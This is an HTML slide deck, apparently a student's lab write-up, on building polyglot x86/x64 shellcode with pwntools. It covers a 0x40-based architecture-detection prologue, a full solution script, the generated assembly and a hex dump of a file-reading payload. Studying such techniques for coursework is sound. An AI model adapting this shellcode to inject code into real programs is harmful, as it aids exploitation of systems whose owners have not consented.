@@ -1,0 +1,647 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>shellcode-poly</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+  :root{
+    color-scheme: dark;
+    --bg:#0b0f14;
+    --bg-2:#121823;
+    --bg-3:#0e141d;
+    --ink:#e7ecf3;
+    --ink-dim:#8b97a8;
+    --ink-faint:#5d6778;
+    --line:#223041;
+    --line-soft:#1a2430;
+    --x86:#e5b567;        /* 32-bit */
+    --x86-dim:rgba(229,181,103,.13);
+    --x86-edge:rgba(229,181,103,.42);
+    --x64:#49c5d0;        /* 64-bit */
+    --x64-dim:rgba(73,197,208,.13);
+    --x64-edge:rgba(73,197,208,.42);
+    --warn:#e06c75;
+    --ok:#8dc891;
+    --sans:'IBM Plex Sans','Segoe UI',system-ui,sans-serif;
+    --mono:'JetBrains Mono','SF Mono',ui-monospace,Menlo,Consolas,monospace;
+  }
+
+  html,body{height:100%;}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);overflow:hidden;}
+
+  .deck{position:fixed;inset:0;display:grid;place-items:center;background:var(--bg);overflow:hidden;}
+  .stage{width:1280px;height:720px;position:relative;transform-origin:center center;
+     background:var(--bg);box-shadow:0 40px 120px rgba(0,0,0,.55);}
+
+  .slide{position:absolute;inset:0;padding:64px 76px 84px;display:flex;flex-direction:column;
+     opacity:0;visibility:hidden;transition:opacity .34s ease;}
+  .slide.active{opacity:1;visibility:visible;}
+  @media (prefers-reduced-motion:reduce){.slide{transition:none;}}
+
+  /* chrome */
+  .rail{position:absolute;left:0;right:0;top:0;height:3px;background:var(--line-soft);z-index:5;}
+  .rail>i{display:block;height:100%;background:linear-gradient(90deg,var(--x86),var(--x64));
+     width:0;transition:width .34s ease;}
+  .foot{position:absolute;left:76px;right:76px;bottom:32px;display:flex;justify-content:space-between;
+     align-items:center;font-family:var(--mono);font-size:12.5px;color:var(--ink-faint);
+     letter-spacing:.02em;z-index:5;}
+  .foot .dot{color:var(--line);}
+  .stage[data-i="0"] .foot{opacity:0;}
+  .foot .num{font-variant-numeric:tabular-nums;}
+
+  /* shared type */
+  .eyebrow{font-family:var(--mono);font-size:13px;letter-spacing:.14em;text-transform:uppercase;
+     color:var(--ink-faint);margin:0 0 22px;}
+  .eyebrow .dot{color:var(--line);}
+  h1{font-size:40px;line-height:1.1;font-weight:600;margin:0 0 20px;letter-spacing:-.015em;
+     text-wrap:balance;color:var(--ink);}
+  .lead{font-size:21px;line-height:1.55;color:var(--ink-dim);max-width:62ch;margin:0;}
+  .lead strong{color:var(--ink);font-weight:600;}
+  .x86{color:var(--x86);} .x64{color:var(--x64);}
+  .warn{color:var(--warn);} .ok{color:var(--ok);}
+  code,.mono{font-family:var(--mono);}
+
+  ul.pts{list-style:none;margin:6px 0 0;padding:0;display:flex;flex-direction:column;gap:16px;max-width:70ch;}
+  ul.pts li{position:relative;padding-left:26px;font-size:20px;line-height:1.5;color:var(--ink-dim);}
+  ul.pts li::before{content:"";position:absolute;left:0;top:11px;width:9px;height:2px;background:var(--ink-faint);}
+  ul.pts li strong{color:var(--ink);font-weight:600;}
+  ul.pts li.t86::before{background:var(--x86);height:9px;top:8px;}
+  ul.pts li.t64::before{background:var(--x64);height:9px;top:8px;}
+
+  /* code block */
+  pre{font-family:var(--mono);background:var(--bg-3);border:1px solid var(--line);
+     border-radius:10px;padding:22px 26px;margin:0;font-size:18px;line-height:1.65;overflow:auto;
+     color:var(--ink);}
+  pre .cm{color:var(--ink-faint);}
+  pre .kw{color:#9db4d8;}
+  pre .st{color:#c9a878;}
+  pre .fn{color:var(--x64);}
+  pre .hl{color:var(--x86);font-weight:700;}
+  pre .ar{color:var(--ink-faint);}
+  .codeslide h1{margin-bottom:16px;}
+  .codeslide pre{font-size:14px;line-height:1.55;padding:18px 24px;}
+
+  /* generated-assembly slide */
+  .asmslide{padding-top:46px;padding-bottom:40px;}
+  .asmslide .eyebrow{margin-bottom:12px;}
+  .asmslide h1{font-size:33px;margin-bottom:2px;}
+  .asmcols{display:grid;grid-template-columns:1fr 1fr;gap:26px;margin-top:16px;min-height:0;}
+  .asmcol{display:flex;flex-direction:column;gap:8px;min-height:0;}
+  .ah{font-family:var(--mono);font-size:11.5px;letter-spacing:.12em;text-transform:uppercase;font-weight:500;}
+  .ah86{color:var(--x86);} .ah64{color:var(--x64);}
+  pre.asmout{font-size:11px;line-height:1.45;padding:14px 16px;border-radius:9px;}
+  .genhead{font-family:var(--mono);font-size:12px;margin:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .gh86{color:var(--x86);} .gh64{color:var(--x64);}
+  @keyframes unfold{from{clip-path:inset(0 0 100% 0 round 9px);}to{clip-path:inset(0 0 0 0 round 9px);}}
+  .asmslide .asmout{clip-path:inset(0 0 0 0 round 9px);}
+  .asmslide.play .asmout{animation:unfold .7s ease both;}
+  .asmslide.play .asmcol:nth-child(2) .asmout{animation-delay:.22s;}
+  @media (prefers-reduced-motion:reduce){.asmslide .asmout{animation:none!important;clip-path:none!important;}}
+
+  /* combined-payload slide */
+  .hexslide .eyebrow{margin-bottom:12px;}
+  .legend{display:flex;gap:24px;margin:2px 0 18px;font-family:var(--mono);font-size:13px;color:var(--ink-dim);}
+  .legend .lg{display:flex;align-items:center;gap:8px;}
+  .legend i{width:12px;height:12px;border-radius:3px;display:inline-block;}
+  .legend .sp{background:var(--ink);} .legend .s64{background:var(--x64);} .legend .s86{background:var(--x86);}
+  pre.hex{font-size:16px;line-height:1.95;letter-spacing:.03em;padding:22px 26px;width:max-content;max-width:100%;}
+  pre.hex .off{color:var(--ink-faint);}
+  pre.hex .hp{color:var(--ink);}
+  pre.hex .h64{color:var(--x64);}
+  pre.hex .h86{color:var(--x86);}
+
+  /* dual-decode table */
+  table.dec{border-collapse:collapse;width:100%;font-size:17.5px;margin-top:4px;}
+  table.dec th{font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;
+     color:var(--ink-faint);text-align:left;font-weight:500;padding:0 18px 12px;border-bottom:1px solid var(--line);}
+  table.dec th.h86{color:var(--x86);} table.dec th.h64{color:var(--x64);}
+  table.dec td{padding:11px 18px;border-bottom:1px solid var(--line-soft);vertical-align:middle;line-height:1.4;}
+  table.dec td.by{font-family:var(--mono);color:var(--ink);font-weight:500;white-space:nowrap;}
+  table.dec td.c86{background:var(--x86-dim);box-shadow:inset 2px 0 0 var(--x86-edge);color:var(--ink);}
+  table.dec td.c64{background:var(--x64-dim);box-shadow:inset 2px 0 0 var(--x64-edge);color:var(--ink);}
+  table.dec td .m{font-family:var(--mono);}
+  table.dec td .q{color:var(--ink-dim);}
+  table.dec tr.pivot td.by{color:var(--x86);}
+  table.dec tr.pivot td{border-bottom:1px solid var(--line);}
+
+  /* step-through state for the decode slide */
+  #decode td.by{position:relative;}
+  #decode tbody tr td{transition:opacity .25s ease;}
+  #decode tbody tr.ghost td{opacity:.16;}
+  #decode tbody tr.cur td.by::before{content:"\25B8";position:absolute;left:5px;color:var(--ink);}
+  @media (prefers-reduced-motion:reduce){#decode tbody tr td{transition:none;}}
+  .statebar{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:18px;}
+  .scard{display:flex;align-items:center;gap:16px;font-family:var(--mono);font-size:15px;
+     border:1px solid var(--line);border-radius:8px;padding:11px 16px;background:var(--bg-2);}
+  .st86{border-color:var(--x86-edge);} .st64{border-color:var(--x64-edge);}
+  .scard .stlab{font-size:11px;letter-spacing:.08em;text-transform:uppercase;}
+  .st86 .stlab{color:var(--x86);} .st64 .stlab{color:var(--x64);}
+  .scard .stval{color:var(--ink-dim);}
+  .scard .stval b{color:var(--ink);font-weight:700;margin-left:4px;font-variant-numeric:tabular-nums;}
+  .scard .stgo{margin-left:auto;font-size:12.5px;}
+  .st86 .stgo{color:var(--x86);} .st64 .stgo{color:var(--x64);}
+
+  /* layout diagram */
+  .mem{display:flex;gap:6px;margin:10px 0 4px;font-family:var(--mono);}
+  .mem .blk{border:1px solid var(--line);border-radius:8px;padding:18px 16px;background:var(--bg-2);}
+  .mem .blk .t{font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-faint);}
+  .mem .blk .n{font-size:17px;color:var(--ink);margin-top:7px;}
+  .mem .pro{flex:0 0 190px;}
+  .mem .a64{flex:1;background:var(--x64-dim);border-color:var(--x64-edge);}
+  .mem .a64 .t{color:var(--x64);}
+  .mem .a86{flex:1;background:var(--x86-dim);border-color:var(--x86-edge);}
+  .mem .a86 .t{color:var(--x86);}
+  .routes{display:flex;flex-direction:column;gap:12px;margin-top:22px;}
+  .route{display:flex;gap:14px;align-items:baseline;font-size:18.5px;color:var(--ink-dim);}
+  .route .tag{font-family:var(--mono);font-size:13px;letter-spacing:.06em;padding:3px 10px;border-radius:5px;
+     flex:0 0 auto;font-weight:500;}
+  .route.r64 .tag{color:var(--x64);background:var(--x64-dim);border:1px solid var(--x64-edge);}
+  .route.r86 .tag{color:var(--x86);background:var(--x86-dim);border:1px solid var(--x86-edge);}
+  .route code{color:var(--ink);}
+
+  /* two-column */
+  .cols{display:grid;grid-template-columns:1.15fr 1fr;gap:34px;align-items:start;}
+  .cols.hist{grid-template-columns:1fr 1.05fr;gap:40px;}
+
+  /* opcode-map visual */
+  .opmap{display:flex;flex-direction:column;gap:7px;}
+  .opmap-brace,.opmap-row{display:grid;grid-template-columns:repeat(16,1fr);gap:4px;}
+  .opmap .brc{font-family:var(--mono);font-size:11px;letter-spacing:.03em;text-align:center;
+     padding:6px 0;border-radius:5px;grid-column:span 8;}
+  .opmap .brc.full{grid-column:span 16;}
+  .opmap .x86t{background:var(--x86-dim);color:var(--x86);border:1px solid var(--x86-edge);}
+  .opmap .x64t{background:var(--x64-dim);color:var(--x64);border:1px solid var(--x64-edge);}
+  .opmap .cell{font-family:var(--mono);font-size:12px;text-align:center;padding:9px 0;
+     background:var(--bg-2);border:1px solid var(--line);border-radius:5px;color:var(--ink-dim);}
+  .opmap .cell.hot{color:var(--ink);background:#1b2430;font-weight:700;
+     border-color:var(--ink-faint);box-shadow:0 0 0 1px var(--ink-faint);}
+  .opmap-cap{font-size:14px;color:var(--ink-faint);line-height:1.5;margin:10px 0 0;max-width:48ch;}
+
+  /* section / closing layout */
+  .mid{justify-content:center;}
+  .mid h1{font-size:46px;max-width:22ch;}
+  .mid .lead{margin-top:20px;}
+
+  /* title slide */
+  .title{justify-content:center;}
+  .title .eyebrow{margin-bottom:30px;}
+  .title h1{font-family:var(--mono);font-size:58px;font-weight:500;letter-spacing:-.01em;margin-bottom:0;}
+  .title .tagline{font-size:22px;color:var(--ink-dim);margin:26px 0 0;max-width:56ch;line-height:1.5;}
+  .title .meta{margin-top:54px;font-family:var(--mono);font-size:14px;color:var(--ink-faint);
+     letter-spacing:.03em;}
+
+  /* terminal */
+  .term{font-family:var(--mono);background:#06090d;border:1px solid var(--line);border-radius:10px;
+     padding:20px 24px;font-size:16.5px;line-height:1.7;color:var(--ink-dim);overflow:auto;white-space:pre-wrap;}
+  .term .p{color:var(--ink-faint);}
+  .term .c{color:var(--ink);}
+  .term .o{color:var(--ink-dim);}
+  .term .f{color:var(--ok);}
+
+  .note{font-size:16.5px;color:var(--ink-faint);line-height:1.5;max-width:72ch;}
+  .note strong{color:var(--ink);font-weight:600;}
+
+  .hint{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);font-family:var(--mono);
+     font-size:12px;color:var(--ink-faint);background:rgba(10,14,20,.85);border:1px solid var(--line);
+     padding:6px 14px;border-radius:20px;z-index:20;transition:opacity .6s ease;letter-spacing:.04em;}
+  .ctrls{position:fixed;bottom:16px;right:18px;z-index:20;display:flex;gap:8px;}
+  .ctrls button{font-family:var(--mono);font-size:12px;color:var(--ink-faint);background:rgba(18,24,35,.8);
+     border:1px solid var(--line);border-radius:7px;padding:6px 10px;cursor:pointer;}
+  .ctrls button:hover{color:var(--ink);border-color:var(--ink-faint);}
+  .ctrls button:focus-visible,.deck:focus-visible{outline:2px solid var(--x64);outline-offset:2px;}
+
+  .spacer{flex:1 1 auto;}
+</style>
+</head>
+<body>
+<div class="deck" id="deck" tabindex="0">
+  <div class="stage" id="stage" data-i="0">
+    <div class="rail"><i id="rail"></i></div>
+
+    <!-- 1 — TITLE -->
+    <section class="slide title active">
+      <p class="eyebrow">CSED559 <span class="dot">·</span> Lab 03</p>
+      <h1>shellcode-poly</h1>
+      <p class="tagline">A polyglot shellcode that runs on both x86 and x64, and how I built it with pwntools.</p>
+      <p class="meta">Park Chanung</p>
+    </section>
+
+    <!-- 2 — THE TASK -->
+    <section class="slide">
+      <p class="eyebrow">The task</p>
+      <h1>Same bytes, two targets</h1>
+      <ul class="pts">
+        <li><code>target</code> feeds <strong>one</strong> payload to <span class="x86">target32</span> (32-bit)
+          and <span class="x64">target64</span> (64-bit).</li>
+        <li>Both must read and print <code>secret.bin</code> at runtime.</li>
+        <li>Print on <strong>both</strong>, and <code>target</code> hands over the flag.</li>
+      </ul>
+      <div class="spacer"></div>
+      <p class="note">The polyglot idea itself came from the article we all read, so this is not a tour of the trick.
+        It is about <strong>how the payload actually gets built</strong>, which is where my solution differs from most.</p>
+    </section>
+
+    <!-- 3 — HISTORY -->
+    <section class="slide">
+      <p class="eyebrow">Background</p>
+      <h1>A short history of <code>0x40</code></h1>
+      <div class="cols hist">
+        <ul class="pts">
+          <li><strong>8086, 1978.</strong> Opcodes <code>40-47</code> are single-byte <code>inc</code> of the eight
+            registers, <code>48-4F</code> are <code>dec</code>. A code-density shortcut, kept through IA-32.</li>
+          <li><strong>AMD64, around 2000.</strong> 16 registers and 64-bit operands need new encodings, but the
+            one-byte opcode map is already full.</li>
+          <li><strong>The fix:</strong> in long mode the whole <code>40-4F</code> range becomes the
+            <span class="x64">REX prefix</span> family. Single-byte inc/dec survive only as the two-byte
+            <code>FF /0</code>, <code>FF /1</code>.</li>
+        </ul>
+        <div class="opmap">
+          <div class="opmap-brace">
+            <span class="brc x86t">inc r32 &middot; 40-47</span>
+            <span class="brc x86t">dec r32 &middot; 48-4F</span>
+          </div>
+          <div class="opmap-row">
+            <span class="cell hot">40</span><span class="cell">41</span><span class="cell">42</span><span class="cell">43</span><span class="cell">44</span><span class="cell">45</span><span class="cell">46</span><span class="cell">47</span><span class="cell">48</span><span class="cell">49</span><span class="cell">4A</span><span class="cell">4B</span><span class="cell">4C</span><span class="cell">4D</span><span class="cell">4E</span><span class="cell">4F</span>
+          </div>
+          <div class="opmap-brace">
+            <span class="brc x64t full">REX prefixes &middot; 64-bit mode</span>
+          </div>
+          <p class="opmap-cap">Sixteen one-byte opcodes, reused. <code>0x40</code> is a full instruction in 32-bit,
+            and a bare prefix in 64-bit.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4 — REX -->
+    <section class="slide">
+      <p class="eyebrow">Background</p>
+      <h1><code>0x40</code> is the <span class="x64">null</span> REX prefix</h1>
+      <div class="cols">
+        <ul class="pts">
+          <li>REX stands for <strong>Register EXtension</strong>. Four bits, <code>W R X B</code>, that extend the
+            next instruction: 64-bit operands and access to <code>r8</code> through <code>r15</code>.</li>
+          <li><code>0x40</code> sets <strong>none</strong> of them.</li>
+          <li>Its one visible effect: it switches the following byte-register operand from the legacy
+            high set (<code>ah ch dh bh</code>) to the uniform low set (<code>spl bpl sil dil</code>).</li>
+        </ul>
+        <div>
+          <pre><span class="cm">; 0 1 0 0  W R X B</span>
+0x40 = 0100 0000
+       <span class="ar">&#9492;&#9472;&#9472;&#9496; &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9496;</span>
+       <span class="cm">REX   all zero</span></pre>
+          <p class="note" style="margin-top:18px">On x86 it is a whole instruction.
+            On x64 it is a prefix that <span class="warn">cannot stand alone</span>.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5 — THE PROLOGUE -->
+    <section class="slide">
+      <p class="eyebrow">Architecture detection</p>
+      <h1>The detection prologue</h1>
+      <pre><span class="kw">xor</span> eax, eax      <span class="cm">; 31 C0</span>
+<span class="kw">.byte</span> <span class="hl">0x40</span>        <span class="cm">; 40        (the pivot byte)</span>
+<span class="kw">mov</span> bh, 1         <span class="cm">; B7 01</span>
+<span class="kw">test</span> eax, eax     <span class="cm">; 85 C0</span>
+<span class="kw">jz</span>  x64          <span class="cm">; 74 02</span>
+<span class="kw">.byte</span> 0xEB, N     <span class="cm">; EB N      (N = len(amd64))</span>
+x64:</pre>
+      <p class="note" style="margin-top:22px">Every mnemonic here is legacy-compatible and encodes identically in both modes.
+        The whole fork rests on the single byte <code>0x40</code>.</p>
+    </section>
+
+    <!-- 6 — DUAL DECODE (centerpiece) -->
+    <section class="slide" id="decode" data-steps="6">
+      <p class="eyebrow">Architecture detection</p>
+      <h1>The same bytes on each CPU</h1>
+      <table class="dec">
+        <thead><tr><th>Bytes</th><th class="h86">x86 (32-bit)</th><th class="h64">x64 (64-bit)</th></tr></thead>
+        <tbody>
+          <tr><td class="by">31 C0</td><td class="c86"><span class="m">xor eax,eax</span> <span class="q">&rarr; eax = 0</span></td><td class="c64"><span class="m">xor eax,eax</span> <span class="q">&rarr; eax = 0</span></td></tr>
+          <tr class="pivot"><td class="by">40</td><td class="c86"><span class="m">inc eax</span> <span class="q">&rarr; eax = 1</span></td><td class="c64"><span class="m">REX prefix</span> <span class="q">(absorbed by next insn)</span></td></tr>
+          <tr><td class="by">B7 01</td><td class="c86"><span class="m">mov bh, 1</span></td><td class="c64"><span class="m">mov dil, 1</span> <span class="q">(REX picks low reg)</span></td></tr>
+          <tr><td class="by">85 C0</td><td class="c86"><span class="m">test eax,eax</span> <span class="q">&rarr; ZF = 0</span></td><td class="c64"><span class="m">test eax,eax</span> <span class="q">&rarr; ZF = 1</span></td></tr>
+          <tr><td class="by">74 02</td><td class="c86"><span class="m">jz</span> <span class="q">not taken</span></td><td class="c64"><span class="m">jz</span> <span class="q">taken</span></td></tr>
+          <tr><td class="by">EB N</td><td class="c86"><span class="m">jmp +N</span></td><td class="c64"><span class="q">never reached</span></td></tr>
+        </tbody>
+      </table>
+      <div class="statebar" aria-hidden="true">
+        <div class="scard st86">
+          <span class="stlab">x86 / 32-bit</span>
+          <span class="stval">eax <b id="e86">?</b></span>
+          <span class="stval">ZF <b id="z86">?</b></span>
+          <span class="stgo" id="g86"></span>
+        </div>
+        <div class="scard st64">
+          <span class="stlab">x64 / 64-bit</span>
+          <span class="stval">eax <b id="e64">?</b></span>
+          <span class="stval">ZF <b id="z64">?</b></span>
+          <span class="stgo" id="g64"></span>
+        </div>
+      </div>
+      <p class="note" style="margin-top:12px;font-size:13.5px"><code>mov bh, 1</code> only gives the REX prefix something to
+        attach to (<code>bh</code> on x86, <code>dil</code> on x64); it never touches <code>eax</code>.</p>
+    </section>
+
+    <!-- 7 — LAYOUT / ROUTING -->
+    <section class="slide">
+      <p class="eyebrow">Architecture detection</p>
+      <h1>Routing each CPU to its payload</h1>
+      <div class="mem">
+        <div class="blk pro"><div class="t">prologue</div><div class="n">11 bytes</div></div>
+        <div class="blk a64"><div class="t">amd64 payload</div><div class="n">64-bit</div></div>
+        <div class="blk a86"><div class="t">i386 payload</div><div class="n">32-bit</div></div>
+      </div>
+      <div class="routes">
+        <div class="route r64"><span class="tag">x64</span><span><code>jz</code> taken, jumps to the byte right after the prologue, into <span class="x64">amd64</span>.</span></div>
+        <div class="route r86"><span class="tag">x86</span><span><code>jz</code> falls through, then <code>jmp +len(amd64)</code> leaps over the amd64 block into <span class="x86">i386</span>.</span></div>
+      </div>
+      <div class="spacer"></div>
+      <p class="note">The order is forced by the branch: x64 can only land immediately after the prologue, so amd64 goes first;
+        x86 has to jump past it, so i386 goes last.</p>
+    </section>
+
+    <!-- 8 — PWNTOOLS -->
+    <section class="slide">
+      <p class="eyebrow">Building the payload</p>
+      <h1>pwntools in this solution</h1>
+      <p class="lead" style="max-width:66ch">pwntools is a Python framework for exploit development and CTF work.
+        <code>from pwn import *</code> pulls its helpers into scope. This solution leans on two of them.</p>
+      <ul class="pts" style="margin-top:24px">
+        <li><strong><code>shellcraft</code></strong> gives you ready-made shellcode written as assembly, organized
+          per architecture (<code>shellcraft.i386</code>, <code>shellcraft.amd64</code>). You ask for an action,
+          it hands back the asm source.</li>
+        <li><strong><code>asm(code, arch=...)</code></strong> assembles that source into raw machine-code bytes
+          for whichever architecture you name.</li>
+      </ul>
+      <div class="spacer"></div>
+      <p class="note">Both run inside one Python script, so there is no separate build step to manage.</p>
+    </section>
+
+    <!-- 9 — SHELLCRAFT CAT2 -->
+    <section class="slide">
+      <p class="eyebrow">Building the payload</p>
+      <h1>Generating the syscalls with <code>shellcraft</code></h1>
+      <pre>i386  = shellcraft.<span class="fn">i386</span>.cat2(<span class="st">'secret.bin'</span>, 1, 0x1000)
+amd64 = shellcraft.<span class="fn">amd64</span>.cat2(<span class="st">'secret.bin'</span>, 1, 0x1000)
+
+i386asm  = asm(i386,  <span class="kw">arch</span>=<span class="st">'i386'</span>)
+amd64asm = asm(amd64, <span class="kw">arch</span>=<span class="st">'amd64'</span>)</pre>
+      <ul class="pts" style="margin-top:18px">
+        <li><code>cat2</code> emits the full <code>open</code>, <code>read</code>, <code>write</code> sequence as assembly, per architecture.</li>
+        <li><strong>Why <code>cat2</code>, not <code>cat</code>?</strong> <code>cat</code> uses <code>sendfile</code>, which is unreliable to a pipe; <code>cat2</code> uses <code>read</code> plus <code>write</code>, which always works.</li>
+        <li><code>asm(code, arch=...)</code> then assembles each one into raw machine-code bytes.</li>
+      </ul>
+    </section>
+
+    <!-- 11 — GENERATED ASSEMBLY -->
+    <section class="slide asmslide" id="gen">
+      <p class="eyebrow">Building the payload</p>
+      <h1>Each call unfolds into assembly</h1>
+      <div class="asmcols">
+        <div class="asmcol">
+          <div class="genhead gh86">asm(shellcraft.i386.cat2(...), arch='i386')</div>
+          <pre class="asmout">  <span class="cm">/* push &#x27;secret.bin\x00&#x27; */</span>
+  push  0x1010101
+  xor   dword ptr [esp], 0x1016f68
+  push  0x622e7465
+  push  0x72636573
+  <span class="cm">/* open(file=&#x27;esp&#x27;, oflag=&#x27;O_RDONLY&#x27;, mode=0x1000) */</span>
+  mov   ebx, esp
+  xor   ecx, ecx
+  xor   edx, edx
+  mov   dh,  0x1000 &gt;&gt; 8
+  <span class="cm">/* call open() */</span>
+  push  SYS_open        <span class="cm">/* 5 */</span>
+  pop   eax
+  int   0x80
+  sub   esp, edx
+  <span class="cm">/* read(fd=&#x27;eax&#x27;, buf=&#x27;esp&#x27;, nbytes=&#x27;edx&#x27;) */</span>
+  mov   ebx, eax
+  mov   ecx, esp
+  <span class="cm">/* call read() */</span>
+  push  SYS_read        <span class="cm">/* 3 */</span>
+  pop   eax
+  int   0x80
+  <span class="cm">/* write(fd=1, buf=&#x27;esp&#x27;, n=&#x27;eax&#x27;) */</span>
+  push  1
+  pop   ebx
+  mov   ecx, esp
+  mov   edx, eax
+  <span class="cm">/* call write() */</span>
+  push  SYS_write       <span class="cm">/* 4 */</span>
+  pop   eax
+  int   0x80</pre>
+        </div>
+        <div class="asmcol">
+          <div class="genhead gh64">asm(shellcraft.amd64.cat2(...), arch='amd64')</div>
+          <pre class="asmout">  <span class="cm">/* push b&#x27;secret.bin\x00&#x27; */</span>
+  push  0x1010101 ^ 0x6e69
+  xor   dword ptr [rsp], 0x1010101
+  mov   rax, 0x622e746572636573
+  push  rax
+  <span class="cm">/* call open(&#x27;rsp&#x27;, &#x27;O_RDONLY&#x27;, 0x1000) */</span>
+  push  SYS_open        <span class="cm">/* 2 */</span>
+  pop   rax
+  mov   rdi, rsp
+  xor   edx, edx
+  mov   dh,  0x1000 &gt;&gt; 8
+  xor   esi, esi        <span class="cm">/* O_RDONLY */</span>
+  syscall
+  sub   rsp, rdx
+  <span class="cm">/* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, &#x27;rdx&#x27;) */</span>
+  mov   rdi, rax
+  xor   eax, eax        <span class="cm">/* SYS_read */</span>
+  mov   rsi, rsp
+  syscall
+  <span class="cm">/* call write(1, &#x27;rsp&#x27;, &#x27;rax&#x27;) */</span>
+  mov   rdx, rax
+  push  SYS_write       <span class="cm">/* 1 */</span>
+  pop   rax
+  push  1
+  pop   rdi
+  mov   rsi, rsp
+  syscall</pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 12 — len() -->
+    <section class="slide">
+      <p class="eyebrow">Building the payload</p>
+      <h1>The jump offset computes itself</h1>
+      <pre><span class="kw">.byte</span> 0xeb, <span class="hl">{len(amd64asm)}</span>   <span class="cm"># displacement that skips the amd64 block</span></pre>
+      <ul class="pts" style="margin-top:24px">
+        <li>Writing this by hand means <span class="warn">counting the amd64 block yourself</span> to fill that one displacement byte.</li>
+        <li>Here Python measures the <strong>already-assembled</strong> bytes.</li>
+        <li>Edit the payload and the offset follows. Nothing to recount, nothing to get wrong.</li>
+      </ul>
+    </section>
+
+    <!-- 14 — FULL SCRIPT -->
+    <section class="slide codeslide">
+      <p class="eyebrow">Building the payload</p>
+      <h1>The full solution</h1>
+      <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+i386  = shellcraft.i386.cat2(<span class="st">'secret.bin'</span>, 1, 0x1000)
+amd64 = shellcraft.amd64.cat2(<span class="st">'secret.bin'</span>, 1, 0x1000)
+
+i386asm  = asm(i386,  arch=<span class="st">'i386'</span>)
+amd64asm = asm(amd64, arch=<span class="st">'amd64'</span>)
+jmpasm = asm(f<span class="st">'''</span>
+<span class="st">xor eax, eax</span>
+<span class="st">.byte 0x40</span>
+<span class="st">mov bh, 1</span>
+<span class="st">test eax, eax</span>
+<span class="st">jz x64</span>
+<span class="st">.byte 0xeb, {</span>len(amd64asm)<span class="st">}</span>
+<span class="st">x64:</span>
+<span class="st">'''</span>, arch=<span class="st">'i386'</span>)
+
+print(jmpasm + amd64asm + i386asm)</pre>
+    </section>
+
+    <!-- 15 — COMBINED PAYLOAD -->
+    <section class="slide hexslide">
+      <p class="eyebrow">Building the payload</p>
+      <h1>The combined payload</h1>
+      <div class="legend">
+        <span class="lg"><i class="sp"></i>prologue &middot; 11 B</span>
+        <span class="lg"><i class="s64"></i>amd64 &middot; 64 B</span>
+        <span class="lg"><i class="s86"></i>i386 &middot; 58 B</span>
+      </div>
+      <pre class="hex"><span class="off">0000</span>  <span class="hp">31</span> <span class="hp">c0</span> <span class="hp">40</span> <span class="hp">b7</span> <span class="hp">01</span> <span class="hp">85</span> <span class="hp">c0</span> <span class="hp">74</span> <span class="hp">02</span> <span class="hp">eb</span> <span class="hp">40</span> <span class="h64">68</span> <span class="h64">68</span> <span class="h64">6f</span> <span class="h64">01</span> <span class="h64">01</span>
+<span class="off">0010</span>  <span class="h64">81</span> <span class="h64">34</span> <span class="h64">24</span> <span class="h64">01</span> <span class="h64">01</span> <span class="h64">01</span> <span class="h64">01</span> <span class="h64">48</span> <span class="h64">b8</span> <span class="h64">73</span> <span class="h64">65</span> <span class="h64">63</span> <span class="h64">72</span> <span class="h64">65</span> <span class="h64">74</span> <span class="h64">2e</span>
+<span class="off">0020</span>  <span class="h64">62</span> <span class="h64">50</span> <span class="h64">6a</span> <span class="h64">02</span> <span class="h64">58</span> <span class="h64">48</span> <span class="h64">89</span> <span class="h64">e7</span> <span class="h64">31</span> <span class="h64">d2</span> <span class="h64">b6</span> <span class="h64">10</span> <span class="h64">31</span> <span class="h64">f6</span> <span class="h64">0f</span> <span class="h64">05</span>
+<span class="off">0030</span>  <span class="h64">48</span> <span class="h64">29</span> <span class="h64">d4</span> <span class="h64">48</span> <span class="h64">89</span> <span class="h64">c7</span> <span class="h64">31</span> <span class="h64">c0</span> <span class="h64">48</span> <span class="h64">89</span> <span class="h64">e6</span> <span class="h64">0f</span> <span class="h64">05</span> <span class="h64">48</span> <span class="h64">89</span> <span class="h64">c2</span>
+<span class="off">0040</span>  <span class="h64">6a</span> <span class="h64">01</span> <span class="h64">58</span> <span class="h64">6a</span> <span class="h64">01</span> <span class="h64">5f</span> <span class="h64">48</span> <span class="h64">89</span> <span class="h64">e6</span> <span class="h64">0f</span> <span class="h64">05</span> <span class="h86">68</span> <span class="h86">01</span> <span class="h86">01</span> <span class="h86">01</span> <span class="h86">01</span>
+<span class="off">0050</span>  <span class="h86">81</span> <span class="h86">34</span> <span class="h86">24</span> <span class="h86">68</span> <span class="h86">6f</span> <span class="h86">01</span> <span class="h86">01</span> <span class="h86">68</span> <span class="h86">65</span> <span class="h86">74</span> <span class="h86">2e</span> <span class="h86">62</span> <span class="h86">68</span> <span class="h86">73</span> <span class="h86">65</span> <span class="h86">63</span>
+<span class="off">0060</span>  <span class="h86">72</span> <span class="h86">89</span> <span class="h86">e3</span> <span class="h86">31</span> <span class="h86">c9</span> <span class="h86">31</span> <span class="h86">d2</span> <span class="h86">b6</span> <span class="h86">10</span> <span class="h86">6a</span> <span class="h86">05</span> <span class="h86">58</span> <span class="h86">cd</span> <span class="h86">80</span> <span class="h86">29</span> <span class="h86">d4</span>
+<span class="off">0070</span>  <span class="h86">89</span> <span class="h86">c3</span> <span class="h86">89</span> <span class="h86">e1</span> <span class="h86">6a</span> <span class="h86">03</span> <span class="h86">58</span> <span class="h86">cd</span> <span class="h86">80</span> <span class="h86">6a</span> <span class="h86">01</span> <span class="h86">5b</span> <span class="h86">89</span> <span class="h86">e1</span> <span class="h86">89</span> <span class="h86">c2</span>
